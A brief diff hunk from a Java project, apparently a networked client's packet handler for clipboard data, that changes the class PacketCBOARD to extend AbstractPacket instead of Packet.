@@ -6,7 +6,7 @@ import java.awt.datatransfer.DataFlavor;
 import com.redpois0n.Connection;
 
 
-public class PacketCBOARD extends Packet {
+public class PacketCBOARD extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
